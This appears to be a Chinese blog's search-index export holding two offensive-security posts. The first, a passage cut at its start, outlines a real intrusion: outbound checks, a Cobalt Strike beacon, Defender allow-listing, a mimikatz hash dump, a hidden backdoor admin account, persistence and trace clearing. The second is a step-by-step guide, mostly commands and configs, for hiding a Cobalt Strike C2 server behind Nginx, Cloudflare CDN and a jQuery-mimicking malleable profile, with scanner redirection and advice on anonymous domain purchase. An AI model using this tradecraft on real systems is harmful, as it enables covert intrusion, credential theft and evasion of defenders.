class="hljs-number">1</span> <span class="hljs-number">80</span><br><br>第<span class="hljs-number">4</span>种协议：HTTP/HTTPS<br><span class="hljs-symbol">curl</span> <span class="hljs-built_in">ip</span>/domain<br><span class="hljs-symbol">linux</span>：wget curl<br><span class="hljs-symbol">windows</span>：certutill powershell bitsadmin regsrv.....<br><br>第<span class="hljs-number">5</span>种协议：DNS<br><span class="hljs-symbol">linux</span>：dig <span class="hljs-comment">@8.8.8.8 www.baidu.com</span><br><span class="hljs-symbol">windows</span>：nslookup www.baidu.com <span class="hljs-number">8</span>.<span class="hljs-number">8</span>.<span class="hljs-number">8</span>.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p> 需要思考：真实极端的环境下，可能存在不出网的情况，该如何处理？</p><h4 id="2-5-查看是否存在域环境"><a href="#2-5-查看是否存在域环境" class="headerlink" title="2.5 查看是否存在域环境"></a>2.5 查看是否存在域环境</h4><blockquote><p>systeminfo</p></blockquote><img src="/2023/06/04/targetXX/6.png" class="" title="This is an example image"><p>结果：是一台windows 10，没有域环境。</p><h2 id="二-内网"><a href="#二-内网" class="headerlink" title="二.内网"></a>二.内网</h2><h4 id="1-CS上线-denfender加白"><a href="#1-CS上线-denfender加白" class="headerlink" title="1. CS上线+denfender加白"></a>1. CS上线+denfender加白</h4><p>CS上线之后，权限已经足够了，做denfender加白，代理流量做好，将流量代理回来。</p><h4 id="2-寻找核心段：横向"><a href="#2-寻找核心段：横向" class="headerlink" title="2.寻找核心段：横向"></a>2.寻找核心段：横向</h4><p>查看已经与当前主机成功建立通信的ip地址，然后扫描该段，扩大战果：</p><blockquote><p>netstat -ano | findstr  ESTABLISHED</p></blockquote><img src="/2023/06/04/targetXX/7.png" class="" title="This is an example image"><p>结果：基本没有与当前主机建立通信的段，蹲了几天结果都是一样。无法横向。</p><h4 id="3-mimikatz直接dump-hash"><a href="#3-mimikatz直接dump-hash" class="headerlink" title="3.mimikatz直接dump hash"></a>3.mimikatz直接dump hash</h4><p>获取密码，一心只想扩大战果，但是环境糟糕。</p><h4 id="4-添加隐藏后门用户并加入管理组"><a href="#4-添加隐藏后门用户并加入管理组" class="headerlink" title="4.添加隐藏后门用户并加入管理组"></a>4.添加隐藏后门用户并加入管理组</h4><h4 id="5-查看浏览器历史记录和账户-密码"><a href="#5-查看浏览器历史记录和账户-密码" class="headerlink" title="5.查看浏览器历史记录和账户+密码"></a>5.查看浏览器历史记录和账户+密码</h4><p>   这家伙跑路了，清理的干干净净</p><h4 id="6-内网信息收集，寻找有用的数据"><a href="#6-内网信息收集，寻找有用的数据" class="headerlink" title="6.内网信息收集，寻找有用的数据"></a>6.内网信息收集，寻找有用的数据</h4><p>  结果：没有有价值的东西</p><h4 id="7-权限维持，写入注册表和自启动项"><a href="#7-权限维持，写入注册表和自启动项" class="headerlink" title="7.权限维持，写入注册表和自启动项"></a>7.权限维持，写入注册表和自启动项</h4><h4 id="8-清楚痕迹"><a href="#8-清楚痕迹" class="headerlink" title="8.清楚痕迹"></a>8.清楚痕迹</h4><p>实战比较敏感，就不考虑放图。</p><h2 id="三-思考"><a href="#三-思考" class="headerlink" title="三.思考"></a>三.思考</h2><p>  <strong>web打点—内网渗透，大家的手法都是差不多的，主要是我们要思考:</strong></p><p>（1）如何扩大战果，web和内网；</p><p>（2）对极端环境的思考和变通；</p><p>（3）目标主机不出网的打法的思考，需要如何去操作；</p><p>（4）代理流量不走socks协议的情况下，如何应对；</p><p>（5）钓鱼无法上线，考虑冲锋马被杀、限制了出网协议、需要考虑如何上线等。</p>]]></content>
    
    
    <categories>
      
      <category>实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>案例</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>APT级隐藏搭建CS4.4教程——Nginx反向代理+C2-Profile+CDN</title>
    <link href="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/"/>
    <url>/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/</url>
    
    <content type="html"><![CDATA[<hr><p>​                                           <strong>《 APT级隐藏搭建CobaltStrike4.4教程——Nginx反向代理+C2-Profile+CDN 》</strong></p><hr><p><strong>声明：</strong><br>         <strong>分享的内容仅用于技术讨论，仅供安全研究与学习之用，如用于其他用途，由使用者承担全部法律及连带责任，如因此产生的一切不良后果与文章作者和本博客不关，文章作者不承担全部法律及连带责任。</strong></p><hr><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>基于渗透的角度，CS是一把利剑，由于其广泛的使用，特征很明显，隐藏c2特征很必要。APT级搭建：使用nginx反向代理+C2-Profile+CDN。</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">cobalt strike：CS 4.4<br>VPS：ubuntu<br>反代：nginx/1.20.1<br>域名：Godaddy/dynadot  <br>CDN：Cloudflare<br></code></pre></td></tr></table></figure><h3 id="一、购买域名、VPS"><a href="#一、购买域名、VPS" class="headerlink" title="一、购买域名、VPS"></a>一、购买域名、VPS</h3><p>1.域名： 购买域名到官网注册账号进行购买就可以 </p><p>​     xyzhome.me是不存在的域名</p><p>​    PS：推荐购买国外的，国外的域名购买不是需要实名认证</p><p>2.VPS： 自行选择厂商购买</p><p>​    安装：java、nginx、net-tools</p><p>​    PS：推荐购买ubuntu、反正不购买windows操作系统就行</p><h3 id="二、Cloudflare做CDN-（域名解析VPS服务器-CDN）"><a href="#二、Cloudflare做CDN-（域名解析VPS服务器-CDN）" class="headerlink" title="二、Cloudflare做CDN （域名解析VPS服务器+CDN）"></a>二、Cloudflare做CDN （域名解析VPS服务器+CDN）</h3><p>域名+vps购买后，通过第三方cloudflare托管，使用cloudflare提供免费的CDN服务：<br>首次使用需要注册cloudflare账号，推荐使用protonmail邮箱进行注册；</p><h4 id="1-域名解析vps服务器："><a href="#1-域名解析vps服务器：" class="headerlink" title="1.域名解析vps服务器："></a>1.域名解析vps服务器：</h4><p>（1）添加需要托管的域名：</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/1.png" class="" title="This is an example image"><p>（2）选择免费的</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/2.png" class="" title="This is an example image"><p>（3）添加一条A记录：添加子域名、vps的IP地址</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/3.png" class="" title="This is an example image"><p>（4）将cloudflare名称服务器（两个cloudflare子域名）复制到域名DNS管理去</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/4.png" class="" title="This is an example image"><p>​            到这步基本完成了：通过域名去访问解析到vps。</p><h4 id="2-生成证书-SSL-x2F-TLS-："><a href="#2-生成证书-SSL-x2F-TLS-：" class="headerlink" title="2.生成证书(SSL&#x2F;TLS)："></a>2.生成证书(SSL&#x2F;TLS)：</h4><p>为了更好的隐藏特征，不使用cs自带的证书，通过利用cloudflare的证书文件去生成“ keystore文件”。</p><p>  （1）SSL&#x2F;TLS—-源服务器—创建证书—默认创建 （因为要给域名做cdn，别人通过访问域名不能找到VPS主机的真实IP地址，而是利用cloudflare的dns服务器提供免费的加速功能）</p><h5 id="A-创建证书："><a href="#A-创建证书：" class="headerlink" title="A.创建证书："></a>A.创建证书：</h5><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/5.png" class="" title="This is an example image"><h5 id="B-选择创建证书的私钥类型：RSA-2048"><a href="#B-选择创建证书的私钥类型：RSA-2048" class="headerlink" title="B.选择创建证书的私钥类型：RSA(2048)"></a>B.选择创建证书的私钥类型：RSA(2048)</h5><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/6.png" class="" title="This is an example image"><h5 id="C-选择密钥生成格式：PEM"><a href="#C-选择密钥生成格式：PEM" class="headerlink" title="C. 选择密钥生成格式：PEM"></a>C. 选择密钥生成格式：PEM</h5><p>将源证书(保存文件名.pem)、私钥(保存文件名.key)复制粘贴保存好，需要上传到服务器上。（ps：不要将两个文件保存反了，会出错）</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/7.png" class="" title="This is an example image"><h4 id="3-CDN-配置-Cloudflare-默认的-TLS-配置为灵活，由于使用-Cloudflare-的证书，改成完全（严格）提高安全性"><a href="#3-CDN-配置-Cloudflare-默认的-TLS-配置为灵活，由于使用-Cloudflare-的证书，改成完全（严格）提高安全性" class="headerlink" title="3.CDN 配置 Cloudflare 默认的 TLS 配置为灵活，由于使用 Cloudflare 的证书，改成完全（严格）提高安全性"></a>3.CDN 配置 Cloudflare 默认的 TLS 配置为灵活，由于使用 Cloudflare 的证书，改成完全（严格）提高安全性</h4><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/8.png" class="" title="This is an example image"><h5 id="（1）规则—-gt-页面规则："><a href="#（1）规则—-gt-页面规则：" class="headerlink" title="（1）规则—&gt;页面规则："></a>（1）规则—&gt;页面规则：</h5><p>禁用缓存推荐的做法是创建 Cloudflare 规则，不代理 js 请求。</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/9.png" class="" title="This is an example image"><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/10.png" class="" title="This is an example image"><p>到这里就完成了域名解析到VPS服务器和给域名做好了CDN。</p><p>接下来登录上vps服务器上通过 pem.pem和key.key文件生成CS的keystore文件。</p><h3 id="三、VPS上生成CS的keystrore文件"><a href="#三、VPS上生成CS的keystrore文件" class="headerlink" title="三、VPS上生成CS的keystrore文件"></a>三、VPS上生成CS的keystrore文件</h3><h4 id="1-VPS的SSL目录下生成keystore文件"><a href="#1-VPS的SSL目录下生成keystore文件" class="headerlink" title="1.VPS的SSL目录下生成keystore文件"></a>1.VPS的SSL目录下生成keystore文件</h4><p>（1）生成 <a href="http://www.xyzhome.me.p12/">www.xyzhome.me.p12</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">密码：mm123456mm<br>域名：www<span class="hljs-selector-class">.xyzhome</span><span class="hljs-selector-class">.me</span><br>openssl pkcs12 -export -<span class="hljs-keyword">in</span> pem<span class="hljs-selector-class">.pem</span> -inkey key<span class="hljs-selector-class">.key</span> -out  www<span class="hljs-selector-class">.xyzhome</span><span class="hljs-selector-class">.me</span><span class="hljs-selector-class">.p12</span> -name www<span class="hljs-selector-class">.xyzhome</span><span class="hljs-selector-class">.me</span> -passout pass:mm123456mm<br></code></pre></td></tr></table></figure><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/11.png" class="" title="This is an example image"><p>（2）生成 <a href="http://www.xyzhome.me.store/">www.xyzhome.me.store</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">keytool -importkeystore -deststorepass mm123456mm -destkeypass mm123456mm -destkeystore  www<span class="hljs-selector-class">.xyzhome</span><span class="hljs-selector-class">.me</span><span class="hljs-selector-class">.store</span> -srckeystore  www<span class="hljs-selector-class">.xyzhome</span><span class="hljs-selector-class">.me</span><span class="hljs-selector-class">.p12</span> -srcstoretype PKCS12 -srcstorepass mm123456mm -alias www<span class="hljs-selector-class">.xyzhome</span>.me<br></code></pre></td></tr></table></figure><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/12.png" class="" title="This is an example image"><p>（3）生成 <a href="http://www.xyzhome.me.store/">www.xyzhome.me.store</a> 文件移动到CS 4.4 的根目录下： </p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/13.png" class="" title="This is an example image"><h3 id="四、VPS上搭建CS"><a href="#四、VPS上搭建CS" class="headerlink" title="四、VPS上搭建CS"></a>四、VPS上搭建CS</h3><h4 id="Profile配置"><a href="#Profile配置" class="headerlink" title="Profile配置:"></a>Profile配置:</h4><p> 需要使用 Profile脚本 让 Beacon 和 Teamserver 之间通讯的流量迷惑他人，显示正常的流量。 Github 上有非常多优秀的 C2-Profile 可供我们使用：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rsmudge/</span>Malleable-C2-Profiles<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/threatexpress/m</span>alleable-c2<br></code></pre></td></tr></table></figure><h5 id="1-下载profile文件——jquery-c2-4-4-profile："><a href="#1-下载profile文件——jquery-c2-4-4-profile：" class="headerlink" title="1.下载profile文件——jquery-c2.4.4.profile："></a>1.下载profile文件——jquery-c2.4.4.profile：</h5><p>（重点：这个文件需要放到CS 的根目录，剩下就是修改这个文件） 这里演示使用<a href="https://github.com/threatexpress/malleable-c2%E7%9A%84jquery-c2.4.4.profile%E3%80%82%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E5%90%8E%E9%9C%80%E8%A6%81%E5%AF%B9">https://github.com/threatexpress/malleable-c2的jquery-c2.4.4.profile。下载下来后需要对</a> Profile 进行修改。</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/14.png" class="" title="This is an example image"><h5 id="2-需要修改四个模块：https-certificate、http-stager、http-get、http-post："><a href="#2-需要修改四个模块：https-certificate、http-stager、http-get、http-post：" class="headerlink" title="2.需要修改四个模块：https-certificate、http-stager、http-get、http-post："></a>2.需要修改四个模块：https-certificate、http-stager、http-get、http-post：</h5><p>（1）修改 https-certificate模块：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> keystore <span class="hljs-comment">&quot;/pathtokeystore&quot;</span>;     <span class="hljs-comment">//这里的/pathtokeystore修改为自己生成的：www.xyzhome.me.store</span><br><span class="hljs-keyword">set</span> password <span class="hljs-comment">&quot;password&quot;</span>;           <span class="hljs-comment">//这里的密码是用于生成keystore文件的密码：mm123456mm</span><br>修改为：<br><span class="hljs-keyword">set</span> keystore <span class="hljs-comment">&quot;www.xyzhome.me.store&quot;</span>;   <br><span class="hljs-keyword">set</span> password <span class="hljs-comment">&quot;mm123456mm&quot;</span>;<br></code></pre></td></tr></table></figure><p>（2）修改 http-stager、http-get、http-post三个模块下的client、sever：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">header</span> <span class="hljs-string">&quot;Host&quot;</span> <span class="hljs-string">&quot;code.jquery.com&quot;</span>;   <span class="hljs-comment">//这里的code.jquery.com是我们需要填写我们的cloudflare上的域名：www.xyzhome.me，Referer：响应的去向</span><br><span class="hljs-keyword">header</span> <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;http://code.jquery.com&quot;</span>;<br>修改为：<br><span class="hljs-keyword">header</span> <span class="hljs-string">&quot;Host&quot;</span> <span class="hljs-string">&quot;www.xyzhome.me&quot;</span>;<br><span class="hljs-keyword">header</span> <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;https://www.google.com&quot;</span>;<br><br><span class="hljs-comment">//需要修改的地方有3处（http-stager、http-get、http-post），因为后期目标上线cs之后，执行命令：shell whomai后，没有回显结果</span><br>在cobalt strike客户端执行命令后才有命令行回显<br><span class="hljs-keyword">header</span> <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/javascript; charset=utf-8&quot;</span><br>修改为：<br><span class="hljs-keyword">header</span> <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/*; charset=utf-8&quot;</span>;<br></code></pre></td></tr></table></figure><p>3.jquery-c2.4.4.profile文件—修改端口</p><p>容易出问题之处：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">有的师傅<span class="hljs-number">443</span>端口是有用处的，需要改成其他的端口。这里需要注意的是免费版的Cloudflare对代理的端口有限制。我们只能设置成如下端口：<br>http：<span class="hljs-number">80</span>、<span class="hljs-number">8080、8880</span>、<span class="hljs-number">2052、2082</span>、<span class="hljs-number">2086、2095</span><br>https：<span class="hljs-number">443、2053</span>、<span class="hljs-number">2083、2087</span>、<span class="hljs-number">2096、8443</span><br></code></pre></td></tr></table></figure><p>（1）修改端口</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> tcp_port <span class="hljs-comment">&quot;42585&quot;</span>;   <br>修改为：<br><span class="hljs-keyword">set</span> tcp_port <span class="hljs-comment">&quot;8443&quot;</span>;   <br></code></pre></td></tr></table></figure><h4 id="Nginx反向代理"><a href="#Nginx反向代理" class="headerlink" title="Nginx反向代理"></a>Nginx反向代理</h4><h5 id="1-Nginx反向代理"><a href="#1-Nginx反向代理" class="headerlink" title="1.Nginx反向代理"></a>1.Nginx反向代理</h5><p>这里是使用 <a href="https://github.com/threatexpress/cs2modrewrite">https://github.com/threatexpress/cs2modrewrite</a> 的nginx脚本做反向代理。(或者考虑域前置的caddy）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python cs2nginx<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">i</span> havex<span class="hljs-selector-class">.profile</span> -c https:<span class="hljs-comment">//127.0.0.1:8443 -r https://www.baidu.com -H www.xyzhome.me</span><br>对各个参数进行说明：<br>-<span class="hljs-selector-tag">i</span> 为模板文件，这个固定的，可以不用管。<br>-c 为后端 CS 绑定的端口，这个会在后面 CS 的配置中有所体现<br>-r 为不合要求的访问 <span class="hljs-number">302</span> 重定向去的位置，这里填了百度<br>-H 为你的域名，这里就是你配的那个<br></code></pre></td></tr></table></figure><p>把输出的内容保存为：nginx.conf。</p><h5 id="2-配置nginx-conf"><a href="#2-配置nginx-conf" class="headerlink" title="2.配置nginx.conf"></a>2.配置nginx.conf</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>修改第<span class="hljs-number">1</span>处：vps是ubuntu，需要root用户去执行，如windows无需修改，这也是nginx做反向代理后 https无法上线的原因<br>user www-data <br>修改为：<br>user root<br><br><span class="hljs-regexp">//</span>修改第<span class="hljs-number">2</span>处：当nginx反代时监听<span class="hljs-number">443</span>端口<br><span class="hljs-comment">#listen 443 ssl;</span><br><span class="hljs-comment">#listen [::]:443 ssl;</span><br>改为：<br>listen <span class="hljs-number">443</span> ssl;<br>listen [::]:<span class="hljs-number">443</span> ssl;<br><br><span class="hljs-regexp">//</span>修改第<span class="hljs-number">3</span>处：因为我们的证书是cloudflare的证书，需要走证书才能做反代<br><span class="hljs-comment">#ssl_certificate /etc/letsencrypt/live/&lt;DOMAIN_NAME&gt;/fullchain.pem; # managed by Certbot</span><br><span class="hljs-comment">#ssl_certificate_key /etc/letsencrypt/live/&lt;DOMAIN_NAME&gt;/privkey.pem; # managed by Certbot</span><br>修改为：<br>ssl_certificate <span class="hljs-regexp">/root/</span>ssl/pem.pem; <span class="hljs-comment"># managed by Certbot</span><br>ssl_certificate_key <span class="hljs-regexp">/root/</span>ssl/key.key; <span class="hljs-comment"># managed by Certbot</span><br><br><br><span class="hljs-regexp">//</span>修改第<span class="hljs-number">4</span>处：定制化处理location块，使得只有指定URL才能访问，保证了不会被扫到，设置指定User-Agent，当User-Agent不符合,直接重定向<span class="hljs-number">302</span>  <br>location ~ ^(<span class="hljs-regexp">/api/</span><span class="hljs-number">516280565959</span>.*|<span class="hljs-regexp">/blog/</span>wp-includes<span class="hljs-regexp">/pomo/</span>src.php.*|<span class="hljs-regexp">/includes/</span>phpmailer<span class="hljs-regexp">/class.pop3.php.*|/i</span>nclude<span class="hljs-regexp">/template/i</span>sx.php.*|<span class="hljs-regexp">/wp06/</span>wp-includes<span class="hljs-regexp">/po.php.*|/</span>api<span class="hljs-regexp">/516280565958.*|/m</span>odules<span class="hljs-regexp">/mod_search.php.*|/</span>wp08<span class="hljs-regexp">/wp-includes/</span>dtcla.php.*)$ &#123;<br>            proxy_pass          <span class="hljs-variable">$C2_SERVER</span>;<br>修改为： <br>location ~ ^(<span class="hljs-regexp">/jquery-3\.3\.1\.slim\.min\.js|/</span>jquery-<span class="hljs-number">3</span>\.<span class="hljs-number">3</span>\.<span class="hljs-number">2</span>\.min\.js|<span class="hljs-regexp">/jquery-3\.3\.1\.min\.js|/</span>jquery-<span class="hljs-number">3</span>\.<span class="hljs-number">3</span>\.<span class="hljs-number">2</span>\.slim\.min\.js)$ &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_user_agent</span> != <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;</span>) &#123;<br>            return <span class="hljs-number">302</span> <span class="hljs-variable">$REDIRECT_DOMAIN</span><span class="hljs-variable">$request_uri</span>;&#125;<br>            proxy_pass          <span class="hljs-variable">$C2_SERVER</span>;<br>            <br><span class="hljs-regexp">//</span>修改第<span class="hljs-number">5</span>处：禁用，否则当你修改完<span class="hljs-number">1</span>到<span class="hljs-number">4</span>处时，<span class="hljs-regexp">/etc/</span>nginx/nginx.conf目录下重启nginx：nginx，直接报错<br>more_set_headers <span class="hljs-string">&#x27;Server: Server&#x27;</span>;<br>修改为：<br><span class="hljs-comment">#more_set_headers &#x27;Server: Server&#x27;;           </span><br></code></pre></td></tr></table></figure><p>修改完以上配置之后，将nginx.conf替换vps上的&#x2F;etc&#x2F;nginx&#x2F;nginx.conf， 重启nginx：nginx</p><p>（1）查看nginx端口是否已经在监听443端口：</p><blockquote><p>netstat -tlnp</p></blockquote><h3 id="五-配置Cobalt-Strike-Teamserver"><a href="#五-配置Cobalt-Strike-Teamserver" class="headerlink" title="五.配置Cobalt Strike - Teamserver"></a>五.配置Cobalt Strike - Teamserver</h3><h4 id="1-修改端口号、修改指向我们www-xyzhome-me-store文件的路径，store文件密码："><a href="#1-修改端口号、修改指向我们www-xyzhome-me-store文件的路径，store文件密码：" class="headerlink" title="1.修改端口号、修改指向我们www.xyzhome.me.store文件的路径，store文件密码："></a>1.修改端口号、修改指向我们<a href="http://www.xyzhome.me.store文件的路径，store文件密码：">www.xyzhome.me.store文件的路径，store文件密码：</a></h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">java -XX:<span class="hljs-attribute">ParallelGCThreads</span>=4 -Dcobaltstrike.<span class="hljs-attribute">server_port</span>=10086 -Dcobaltstrike.<span class="hljs-attribute">server_bindto</span>=0.0.0.0 -Djavax.net.ssl.<span class="hljs-attribute">keyStore</span>=./www.xyzhome.me.store -Djavax.net.ssl.<span class="hljs-attribute">keyStorePassword</span>=mm123456mm -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./IceRiver.jar -Duser.<span class="hljs-attribute">language</span>=en server.TeamServer $*<br></code></pre></td></tr></table></figure><h4 id="2-启动teamserver"><a href="#2-启动teamserver" class="headerlink" title="2.启动teamserver"></a>2.启动teamserver</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">./teamserver vps_ip <span class="hljs-number">123456</span>  jquery-<span class="hljs-built_in">c2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">4</span>.profile<br></code></pre></td></tr></table></figure><h3 id="六-客户端登录-—-目标上线"><a href="#六-客户端登录-—-目标上线" class="headerlink" title="六.客户端登录 — 目标上线"></a>六.客户端登录 — 目标上线</h3><h4 id="1-登录，设置listeners："><a href="#1-登录，设置listeners：" class="headerlink" title="1.登录，设置listeners："></a>1.登录，设置listeners：</h4><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/15.png" class="" title="This is an example image"><h4 id="2-目标上线—执行命令："><a href="#2-目标上线—执行命令：" class="headerlink" title="2.目标上线—执行命令："></a>2.目标上线—执行命令：</h4><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/16.png" class="" title="This is an example image">]]></content>
    
    
    <categories>
      
      <category>CobaltStrike</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
